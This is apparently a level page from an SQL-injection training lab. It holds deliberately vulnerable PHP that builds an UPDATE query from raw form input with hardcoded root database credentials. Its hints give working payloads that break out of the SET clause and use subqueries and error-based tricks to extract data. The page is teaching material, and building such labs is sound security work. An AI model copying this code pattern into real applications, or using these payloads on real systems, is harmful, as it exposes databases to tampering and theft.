<?php
$mysqli = new mysqli('db','root','rootpassword','sqli_lab');
$id = $_POST['id'] ?? '';
$username = $_POST['username'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $id && $username) {
    $sql = "UPDATE users SET username = '$username' WHERE id = $id";
    if ($mysqli->query($sql)) {
        echo 'User updated successfully';
    } else {
        die('Error: '.$mysqli->error);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 11 - UPDATE-based SQL Injection</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8fafc;
            color: #334155;
            line-height: 1.6;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: #1e293b;
            color: white;
            padding: 2rem;
            border-radius: 12px;
            margin-bottom: 2rem;
        }
        
        .header h1 {
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }
        
        .form-container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            margin-bottom: 2rem;
        }
        
        .code-block {
            background: #1e293b;
            color: #e2e8f0;
            padding: 1rem;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            margin: 1rem 0;
            overflow-x: auto;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: #374151;
        }
        
        .form-group input {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            font-size: 1rem;
        }
        
        .btn {
            background: #3b82f6;
            color: white;
            padding: 0.75rem 1.5rem;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.2s;
        }
        
        .btn:hover {
            background: #2563eb;
        }
        
        .hint-btn {
            background: #10b981;
            margin-bottom: 1rem;
        }
        
        .hint-btn:hover {
            background: #059669;
        }
        
        .hint-box {
            background: #f0fdf4;
            border: 1px solid #16a34a;
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
        }
        
        .hint-box h4 {
            color: #166534;
            margin-bottom: 0.5rem;
        }
        
        .hint-box code {
            background: #1e293b;
            color: #e2e8f0;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        
        .result {
            background: #eff6ff;
            border: 1px solid #3b82f6;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
        }
        
        .error {
            background: #fef2f2;
            border: 1px solid #ef4444;
            color: #dc2626;
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
        }
        
        .navigation {
            display: flex;
            justify-content: center;
            gap: 1rem;
            flex-wrap: wrap;
        }
        
        .navigation a {
            background: #64748b;
            color: white;
            padding: 0.75rem 1.5rem;
            text-decoration: none;
            border-radius: 6px;
            transition: background 0.2s;
        }
        
        .navigation a:hover {
            background: #475569;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>✏️ Level 11 - UPDATE-based SQL Injection</h1>
            <p><strong>Attack Type:</strong> Exploit UPDATE statements to modify data and extract sensitive information</p>
        </div>

        <div class="form-container">
            <h3>Current Query:</h3>
            <div class="code-block">UPDATE users SET username = '<?php echo htmlspecialchars($_POST['username'] ?? 'NULL'); ?>' WHERE id = <?php echo htmlspecialchars($_POST['id'] ?? 'NULL'); ?></div>
            
            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['id'])) {
                echo '<h3>Result:</h3>';
                echo '<div class="result">';
                
                $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                $id = $_POST['id'];
                $username = $_POST['username'] ?? '';

                if ($id && $username) {
                    $sql = "UPDATE users SET username = '$username' WHERE id = $id";
                    if ($mysqli->query($sql)) {
                        echo '✅ User updated successfully';
                        echo '<br>Affected rows: ' . $mysqli->affected_rows;
                    } else {
                        echo '<div class="error">❌ Error: '.$mysqli->error.'</div>';
                    }
                } else {
                    echo '<div class="error">❌ Please fill in all fields</div>';
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Update User Form:</h3>
            <form method="post">
                <div class="form-group">
                    <label for="id">User ID:</label>
                    <input type="text" id="id" name="id" value="<?php echo htmlspecialchars($_POST['id'] ?? ''); ?>" placeholder="Enter user ID">
                </div>
                <div class="form-group">
                    <label for="username">New Username:</label>
                    <input type="text" id="username" name="username" value="<?php echo htmlspecialchars($_POST['username'] ?? ''); ?>" placeholder="Enter new username">
                </div>
                <button type="submit" class="btn">🚀 Update User</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding UPDATE Injection</h4>
                    <p>UPDATE statements modify existing data and can be exploited when user input is not properly sanitized.</p>
                    <p>Try a normal update first: ID = <code>1</code>, Username = <code>alice_updated</code></p>
                    <p>This should update user with ID 1.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Breaking Out of SET Clause</h4>
                    <p>We can break out of the SET clause and add additional SQL commands.</p>
                    <p>Try: ID = <code>1</code>, Username = <code>alice' WHERE id=1#</code></p>
                    <p>The # comments out the rest of the query.</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Using Subqueries in UPDATE</h4>
                    <p>We can use subqueries to extract data during the update process.</p>
                    <p>Try: ID = <code>1</code>, Username = <code>alice', password=(SELECT flag FROM levels WHERE id=11) WHERE id=1#</code></p>
                    <p>This updates both username and password fields.</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Error-based Extraction</h4>
                    <p>If direct extraction doesn't work, use error-based techniques.</p>
                    <p>Try: ID = <code>1</code>, Username = <code>alice' AND (SELECT flag FROM levels WHERE id=11)='</code></p>
                    <p>This will cause a syntax error that might reveal information.</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Final Payload</h4>
                    <p>Extract the flag for level 11 using UPDATE injection:</p>
                    <p>ID = <code>1</code></p>
                    <p>Username = <code>test', username=(SELECT CONCAT('FLAG:', flag) FROM levels WHERE id=11) WHERE id=1#</code></p>
                    <p>This updates the username field with the flag value.</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level10.php">⬅️ Previous Level</a>
            <a href="level12.php">➡️ Next Level</a>
            <a href="submit.php?level=11">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }
    </script>
</body>
</html>
